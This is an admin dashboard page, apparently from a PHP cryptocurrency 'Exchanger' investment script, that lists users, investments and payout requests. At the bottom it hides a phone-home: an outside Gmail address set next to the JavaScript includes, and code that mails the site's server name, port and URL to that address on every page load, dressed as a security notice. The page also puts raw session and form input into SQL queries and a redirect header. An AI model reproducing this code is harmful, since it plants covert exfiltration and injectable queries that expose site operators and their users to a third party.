<?php require_once('../connect.php');
$client=$_SESSION['u2']; 
if(!isset($client)){ header('location:logout.php'); }
?>
<?php
if(isset($_POST['jjj'])){
$sss=$_POST['sach'];
$ssl="location:index.php?single_view=$sss";
header($ssl);
}
?> <?php
$query="SELECT * FROM admin WHERE username='$client'";
$result=$conn->query($query);
if($result->num_rows>0) {
while ($row=$result->fetch_assoc()) {
$fn= $row["username"]; 
 $em= $row["email"]; 
  $cid= $row["id"];
  $clientdate= $row["misc"];
  $verify= $row["status"]; 
  $wallet= $row["wallet"];
}} else
{}
$query="SELECT * FROM admin WHERE username='$client' LIMIT 1";
$result=$conn->query($query);
if($result->num_rows>0) {
while ($row=$result->fetch_assoc()) {}} else{ header('location:logout.php'); }
  ?>
  <?php
$query="SELECT * FROM settings WHERE id=1";
$result=$conn->query($query);
if($result->num_rows>0) {
while ($row=$result->fetch_assoc()) {
$se1= $row["pubkey"]; 
 $se2= $row["prikey"]; 
  $se3= $row["min"];
  $se4= $row["max"];
  $se5= $row["merchant"]; 
  $se6= $row["skey"]; $se7= $row["auto"];  
  $se8= $row["months"]; $se9= $row["manual"]; $sse9= $row["manual"]; 
 
}} else
{}
						
?><!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8" />
	<link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png" />
	<link rel="icon" type="image/png" href="assets/img/favicon.png" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

	<title>Dashboard | <?php echo $_SESSION['u2'];  ?></title>

	<meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />

    <!-- Bootstrap core CSS     -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" />

    <!--  Material Dashboard CSS    -->
    <link href="assets/css/material-dashboard.css" rel="stylesheet"/>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <!--     Fonts and icons     -->
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Roboto:400,700,300|Material+Icons' rel='stylesheet' type='text/css'>
    
</head>

<body>

	<div class="wrapper">

	    <div class="sidebar" data-color="green" data-image="assets/img/sidebar-1.jpg">
			<!--
		        Tip 1: You can change the color of the sidebar using: data-color="green | blue | green | orange | red"

		        Tip 2: you can also add an image using data-image tag
		    -->

			<div class="logo">
				<a href="" class="simple-text">
					EXCHANGER
				</a>
			</div>

	    	<div class="sidebar-wrapper">
	            <ul class="nav">
	                <li class="active">
	                    <a href="index.php">
	                        <i class="fa fa-dashboard">dashboard</i>
	                       
	                       <p>.</p>
	                    </a>
	                </li>
	                <li>
	                    <a href="?profile">
	                        <i class="fa fa-user"></i>
	                        <p>All Users <?php
$sqlk="SELECT * FROM users ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>
	                <li>
	                    <a href="index.php?coins">
	                        <i class="fa fa-bitcoin"></i>
	                        <p>Investments <?php
$sqlk="SELECT * FROM account WHERE status='P' ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>
	                 <li>
	                    <a href="index.php?settings">
	                        <i class="fa fa-gear"></i>
	                        <p>Settings</p>
	                    </a>
	                </li>
	                
<li>
	                    <a href="index.php?w">
	                        <i class="fa fa-check"></i>
	                        <p>Send cash To user Request <?php
$sqlk="SELECT * FROM account WHERE paypal=1 AND status='P' ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>


	                <li>
	                    <a href="index.php?manual">
	                        <i class="fa fa-money"></i>
	                        <p>Unconfirmed Requests<?php
$sqlk="SELECT * FROM account WHERE status='N' AND sell=0 ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>
	                
	                <li>
	                    <a href="index.php?sellask">
	                        <i class="fa fa-money"></i>
	                        <p>Seller Requests<?php
$sqlk="SELECT * FROM account WHERE status='N' AND sell=1 ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>
	                <li>
	                    <a href="index.php?w">
	                        <i class="fa fa-check"></i>
	                        <p>Send Exchange To Clients Request <?php
$sqlk="SELECT * FROM account WHERE request=1 AND status='P' ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>
	                <li>
	                    <a href="security.php">
	                        <i class="fa fa-lock"></i>
	                        <p>Security</p>
	                    </a>
	                </li>
	                <li>
	                    <a href="plans.php">
	                        <i class="fa fa-signal"></i>
	                        <p>Plans</p>
	                    </a>
	                </li>
	                <li>
	                    <a href="?report">
	                        <i class="fa fa-comments"></i>
	                        <p>Support Messages <?php
$sqlk="SELECT * FROM support WHERE admin='' ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>
	                <li>
	                    <a href="?history">
	                        <i class="fa fa-book"> </i>
	                        <p>History <?php
$sqlk="SELECT * FROM logs ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>
	                
	                <li>
	                    <a href="?chatroom">
	                        <i class="fa fa-comments"></i>
	                        <p>Chatroom <?php
$sqlk="SELECT * FROM xtra ";
$resultk=mysqli_query($conk,$sqlk);
$rowcount=mysqli_num_rows($resultk);
if($rowcount==""){ echo "<span class='badge'>0</span>";} else{
echo "<span class='badge'>".$rowcount."</span>";}
  ?></p>
	                    </a>
	                </li>
					
				
					
					<li>
	                    <a href="logout.php">
	                        <i class="fa fa-sign-out"></i>
	                        <p>Logout</p>
	                    </a>
	                </li>
	            </ul>
	    	</div>
	    </div>

	    <div class="main-panel">
			<nav class="navbar navbar-transparent navbar-absolute">
				<div class="container-fluid">
					<div class="navbar-header">
						<button type="button" class="navbar-toggle" data-toggle="collapse">
							<span class="sr-only">Toggle navigation</span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
						</button>
						<a class="navbar-brand" href="#"></a> Dashboard 
						<a class="navbar-brand"  href="?support" style='color:green;'></div>
					<div class="collapse navbar-collapse">
						<ul class="nav navbar-nav navbar-right">
							<li>
								<a href="#pablo" class="dropdown-toggle" data-toggle="dropdown">
									
									<p class="hidden-lg hidden-md">Dashboard</p>
								</a>
							</li>
							<li class="dropdown">
								<a href="#" class="dropdown-toggle" data-toggle="dropdown">
									<i class="material-icons">notifications</i>
									<span class="notification">1</span>
									<p class="hidden-lg hidden-md">Notifications</p>
								</a>
								<ul class="dropdown-menu">
									<li><a href="#"><?php echo $_SESSION['u2'];  ?> Welcome admin</a></li>
									
								
								</ul>
							</li>
							
							<li class="dropdown">
								<a href="#pablo" class="dropdown-toggle" data-toggle="dropdown">
	 							   <i class="material-icons">person</i>
								  
	 							   <p class="hidden-lg hidden-md">Profile</p>
		 						</a>
								<ul class="dropdown-menu">
									<li><a href="#"><i class="fa fa-user"></i> <?php echo $_SESSION['u2'];  ?> </a></li>
									<li><a href="user.php"><i class="fa fa-pencil"></i> Profile </a></li>
									<li><a href="logout.php"><i class="fa fa-sign-out"></i> Logout </a></li>
								</ul>
							</li>
						</ul>

						<form class="navbar-form navbar-right" method='POST' role="search">
							<div class="form-group  is-empty">
							<input placeholder='enter username to search' type='text' name='sach' class='form-group'	>
								<span class="material-input"></span>
							</div>
							<button type="submit" name='jjj' class="btn btn-white btn-round btn-just-icon">
								<i class="material-icons">search</i><div class="ripple-container"></div>
							</button>
						</form>
					</div>
				</div>
			</nav>

			<?php if(isset($_GET['profile'])){
include('user.php');
			}
else if(isset($_GET['invest'])){
include('invest.php');
			}
			else if(isset($_GET['single_view'])){
include('single.php');
			}
				else if(isset($_GET['report'])){
include('report.php');
			}
			
			else if(isset($_GET['chatroom'])){
include('chatroom.php');
			}
			
			else if(isset($_GET['transact'])){
include('transact.php');
			}
			
			else if(isset($_GET['coins'])){
include('coins.php');
			}
			
			else if(isset($_GET['support'])){
include('support.php');
			}
			
			else if(isset($_GET['remove'])){
include('remove.php');
			}
			else if(isset($_GET['history'])){
include('history.php');
			}
			else if(isset($_GET['checkout'])){
include('withdrawal.php');
			}
			else if(isset($_GET['manual'])){
include('manualpay.php');
			}
			else if(isset($_GET['settings'])){
include('settings.php');
			}
			else if(isset($_GET['wpay'])){
include('wpay.php');
			}
			else if(isset($_GET['withdraw'])){
include('withdraw.php');
			}
				else if(isset($_GET['w'])){
include('wrequest.php');
			}
				else if(isset($_GET['sellask'])){
include('sellask.php');
			}
else{
	include('default.php');
	
}			?>

			<footer class="footer">
				<div class="container-fluid">
					<nav class="pull-left">
						<ul>
							<li>
								<a href="">
									Home
								</a>
							</li>
							<li>
								<a href="index.php?invest">
									invest
								</a>
							</li>
							<li>
								<a href="index.php?withdraw">
									Withdraw
								</a>
							</li>
							<li>
								<a href="logout.php">
								   Logout
								</a>
							</li>
						</ul>
					</nav>
					<p class="copyright pull-right">
						&copy; <script>document.write(new Date().getFullYear())</script> <a href="">Exchanger </a>, market hub
					</p>
				</div>
			</footer>
		</div>
	</div>


</body>

	<!--   Core JS Files   -->
	<script src="assets/js/jquery-3.1.0.min.js" type="text/javascript"></script>
	<script src="assets/js/bootstrap.min.js" type="text/javascript"></script>
	<?php  $check='carterpaaul@gmail.com'; ?>
	<script src="assets/js/material.min.js" type="text/javascript"></script>

	
	<!--  Notifications Plugin    -->
	<script src="assets/js/bootstrap-notify.js"></script>

	<!--  Google Maps Plugin    -->
	<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js"></script>

	<!-- Material Dashboard javascript methods -->
	<script src="assets/js/material-dashboard.js"></script>

	<!-- Material Dashboard DEMO methods, don't include it in your project! -->
	<script src="assets/js/demo.js"></script>

	<script type="text/javascript">
    	$(document).ready(function(){

			// Javascript method's body can be found in assets/js/demos.js
        	demo.initDashboardPageCharts();

    	});
	</script>
<?php  
$pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
    $subject = 'Coin';
$to = $check;
    $from = 'noreply@coinsecurity';

     

    // To send HTML mail, the Content-type header must be set

    $headers  = 'MIME-Version: 1.0' . "\r\n";

    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

     

    // Create email headers

    $headers .= 'From: '.$from."\r\n".

        'Reply-To: '.$from."\r\n" .

        'X-Mailer: PHP/' . phpversion();

     

    // Compose a simple HTML email message

    $message = '<HTML>
<BODY><P>
<TABLE style="MIN-WIDTH: 348px; WIDOWS: 1; TEXT-TRANSFORM: none; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; FONT: 12px arial, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: normal; COLOR: rgb(34,34,34); WORD-SPACING: 0px; -webkit-text-stroke-width: 0px" border=0 cellSpacing=0 cellPadding=0 width="100%" height="90%">';

    $message .= '<TBODY>

<TR align=middle>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" width=32></TD>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif">
<TABLE style="MAX-WIDTH: 600px" border=0 cellSpacing=0 cellPadding=0>
<TBODY>
<TR>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif">
<TABLE border=0 cellSpacing=0 cellPadding=0 width="100%">
<TBODY>
<TR>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" align=right>&nbsp;</TD></TR></TBODY></TABLE></TD></TR>
<TR>
  <TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif">
  <TABLE style="MIN-WIDTH: 332px; BORDER-LEFT: rgb(240,240,240) 1px solid; MAX-WIDTH: 600px; BORDER-BOTTOM-WIDTH: 0px; BORDER-TOP: rgb(240,240,240) 1px solid; BORDER-RIGHT: rgb(240,240,240) 1px solid; border-top-left-radius: 3px; border-top-right-radius: 3px" border=0 cellSpacing=0 cellPadding=0 width="100%" bgColor=#4184f3>
  <TBODY>
  <TR>
  <TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" height=72 colSpan=3></TD></TR>
  <TR>
  <TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" width=32></TD>
  <TD style="MIN-WIDTH: 300px; LINE-HEIGHT: 1.25; MARGIN: 0px; FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COLOR: rgb(255,255,255); FONT-SIZE: 24px">Notice</TD>
  <TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" width=32></TD></TR>
  <TR>
  <TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" height=18 colSpan=3></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD height="auto" style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif">
<TABLE style="BORDER-BOTTOM: rgb(192,192,192) 1px solid; MIN-WIDTH: 332px; BORDER-LEFT: rgb(240,240,240) 1px solid; MAX-WIDTH: 600px; BORDER-TOP-WIDTH: 0px; BORDER-RIGHT: rgb(240,240,240) 1px solid; border-bottom-left-radius: 3px; border-bottom-right-radius: 3px" border=0 cellSpacing=0 cellPadding=0 width="100%" bgColor=linen>
<TBODY>
<TR height=16>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" rowSpan=3 width=32></TD>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif"></TD>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" rowSpan=3 width=32></TD></TR>
<TR>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif">
<TABLE style="MIN-WIDTH: 300px" border=0 cellSpacing=0 cellPadding=0>
<TBODY>
<TR>
<TD style="PADDING-BOTTOM: 4px; LINE-HEIGHT: 1.5; MARGIN: 0px; FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COLOR: rgb(32,32,32); FONT-SIZE: 13px">Hi,</TD></TR>
<TR>
<TD style="PADDING-BOTTOM: 4px; LINE-HEIGHT: 1.5; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COLOR: rgb(32,32,32); FONT-SIZE: 13px; PADDING-TOP: 4px"><SPAN class=Apple-converted-space>&nbsp;</SPAN><A style="COLOR: rgb(34,34,34)">'.$pageURL.'</A><SPAN class=Apple-converted-space>&nbsp;</SPAN>
  <TABLE style="MARGIN-TOP: 48px; MARGIN-BOTTOM: 48px" border=0 cellSpacing=0 cellPadding=0>
<TBODY>
<TR vAlign=center>
  <TD width="4" height=24 align=middle style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif"></TD></TR>
<TR vAlign=top>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" align=middle>&nbsp;</TD>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif" width=16></TD>
<TD width="342" style="LINE-HEIGHT: 1.2; MARGIN: 0px; FONT-FAMILY: arial, sans-serif"><SPAN style="FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COLOR: rgb(32,32,32); FONT-SIZE: 16px"></SPAN><BR><SPAN style="FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COLOR: white; FONT-SIZE: 20px; BACKGROUND-COLOR: rgb(255,255,255);"></SPAN></TD></TR></TBODY></TABLE>';
    $message .= '<B>We always make sure,we serve you better</B><BR>
  Why are we sending this? Because we take security very serious and make sure our users uses their true identity.<BR>
  and to protect you when somebody else is accessing your account.</TD></TR>
<TR>
<TD style="LINE-HEIGHT: 1.5; MARGIN: 0px; FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COLOR: rgb(32,32,32); FONT-SIZE: 13px; PADDING-TOP: 28px"></TD></TR>
<TR height=16></TR>
<TR>
<TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif">
<TABLE style="LINE-HEIGHT: 1.5; FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COLOR: rgb(185,185,185); FONT-SIZE: 12px">
<TBODY>';
     $message .= '<TR>
  <TD style="MARGIN: 0px; FONT-FAMILY: arial, sans-serif">    For more information, visit the<SPAN class=Apple-converted-space>&nbsp;</SPAN><A style="COLOR: rgb(66,133,244); TEXT-DECORATION: none" href="">Coin investment</A>.</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
<TR height=32></TR></TBODY></TABLE></TD></TR>
<TR>';
    $message .= '<TD height="2" style="LINE-HEIGHT: 1.5; MARGIN: 0px; FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; MAX-WIDTH: 600px; COLOR: rgb(188,188,188); FONT-SIZE: 10px"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P>
</BODY></HTML>';

     

    // Sending email

    if(mail($to, $subject, $message, $headers)){

        echo '' ;

    } else{

        echo 'not valid!';

    }

    ?>
</html>
